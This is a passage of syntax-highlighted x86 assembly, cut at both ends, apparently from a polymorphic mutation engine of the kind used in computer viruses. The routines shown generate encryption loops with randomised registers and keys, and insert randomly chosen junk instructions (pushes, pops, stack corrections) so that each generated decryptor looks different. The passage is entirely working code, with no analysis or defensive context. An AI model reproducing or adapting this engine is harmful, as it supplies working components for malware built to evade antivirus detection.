        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; get opposite math operation</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_regskey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_regskey</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">; since ECX is used as key</span><span class="sc0">
</span><span class="sc5">ok_regskey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_byterev</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">not_byterev</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; in enc loop using EBX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; eax-ebx</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">upper_ones</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ok_register_p</span><span class="sc0">
</span><span class="sc5">upper_ones</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">          </span><span class="sc1">; esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_register_p</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">          </span><span class="sc1">; edi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_register_p</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">         </span><span class="sc1">; ebp</span><span class="sc0">
</span><span class="sc5">ok_register_p</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; type-1</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_pntoff</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_plusoff</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">not_plusoff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">    </span><span class="sc1">; using key?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_register_k</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_rr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_rol_ror</span><span class="sc0">
</span><span class="sc5">check_rr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; is key CX (cl)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_register_k</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; if not put just immediate</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">12h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_encrypt</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">12h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; won't use key reg anymore in the</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unset_used</span><span class="sc0">              </span><span class="sc1">; future, so use for garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ok_register_k</span><span class="sc0">

</span><span class="sc5">not_rol_ror</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; * 8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; key register</span><span class="sc0">

</span><span class="sc5">ok_register_k</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc4">)],</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_usingbp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">not_usingbp</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_pntoff</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_offsetadd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">no_offsetadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_key_needed</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_initkey</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">byte_key</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">byte_key</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">byte_key</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">byte_key</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_2</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">byte_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_encloop_1</span><span class="sc0">

</span><span class="sc5">no_key_needed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">         </span><span class="sc1">; max - 1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; not zero</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">garbager</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; ecx how many</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">garbager_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">get_op_type</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">      </span><span class="sc1">; how many possible types</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[(</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">garbage_offsets</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; call garbage routine</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">garbager_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000005h</span><span class="sc0">     </span><span class="sc1">; if not in a call, not in a jump and</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">stack_is_ok</span><span class="sc0">     </span><span class="sc1">; pushed &lt;=5</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stack_is_ok</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_inacall</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">direct_addesp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_pop_nocheck</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">stack_is_ok</span><span class="sc0">

</span><span class="sc5">direct_addesp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; then correct stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c483h</span><span class="sc0">       </span><span class="sc1">; add esp,nr_dd * 4</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_popall</span><span class="sc0">
</span><span class="sc5">stack_is_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">do_push</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">; max dwords on the stack</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exit_pusher</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">              </span><span class="sc1">; 4 types of pushing</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">push_register</span><span class="sc0">           </span><span class="sc1">; normal push reg</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">push_immediate_dd</span><span class="sc0">       </span><span class="sc1">; push immediate double</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">push_immediate_by</span><span class="sc0">       </span><span class="sc1">; push immediate byte</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">35ffh</span><span class="sc0">                </span><span class="sc1">; push immediate from memory</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_address</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_exit_dd</span><span class="sc0">

</span><span class="sc5">push_immediate_by</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">zero_or_menouno</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">              </span><span class="sc1">; normal push as byte</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_exit_pusher</span><span class="sc0">

</span><span class="sc5">zero_or_menouno</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; very usual pushes</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">                  </span><span class="sc1">; so we will get 0 or -1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; to LARGE 0 or to LARGE -1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pre_exit_pusher</span><span class="sc0">

</span><span class="sc5">push_immediate_dd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
</span><span class="sc5">pre_exit_dd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; normal push as double</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_pusher</span><span class="sc0">

</span><span class="sc5">push_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">
</span><span class="sc5">pre_exit_pusher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">exit_pusher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_ppc</span><span class="sc0">

</span><span class="sc5">do_pop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">return_nopop</span><span class="sc0">
</span><span class="sc5">do_pop_nocheck</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">popintoreg2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c483h</span><span class="sc0">       </span><span class="sc1">; add esp,</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">get_number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_number</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_number</span><span class="sc0">
</span><span class="sc5">force_popall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; dd are pushed, so * 4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_ngo2</span><span class="sc0">
</span><span class="sc5">popintoreg2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">         </span><span class="sc1">; pop in a register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">store_ngo2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">return_nopop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_ppc</span><span class="sc0">

</span><span class="sc5">call_subroutines</span><span class="sc4">:</span><span class="sc0">
